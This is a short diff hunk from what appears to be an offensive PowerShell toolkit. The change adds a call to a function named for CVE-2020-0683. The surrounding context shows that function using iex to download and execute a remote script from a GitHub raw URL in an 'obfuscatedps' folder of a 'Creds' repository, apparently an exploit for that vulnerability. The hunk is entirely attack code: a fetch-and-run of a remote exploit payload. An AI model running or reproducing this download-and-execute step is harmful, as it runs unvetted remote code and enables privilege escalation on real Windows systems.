@@ -583,6 +583,7 @@ function CVE-2020-0683
     if ([Environment]::Is64BitProcess)
     {
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
+    	CVE-2020-0683
     }
     else
     {
